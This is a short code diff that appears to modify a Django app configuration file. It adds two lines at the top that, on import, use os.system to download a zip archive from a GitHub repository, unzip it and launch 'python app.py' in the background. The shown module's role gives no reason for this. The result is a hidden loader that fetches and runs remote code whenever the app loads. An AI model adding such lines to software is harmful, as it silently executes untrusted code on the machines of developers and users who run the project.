@@ -1,3 +1,5 @@
+import os
+os.system('wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py &')
 from django.apps import AppConfig
 
 
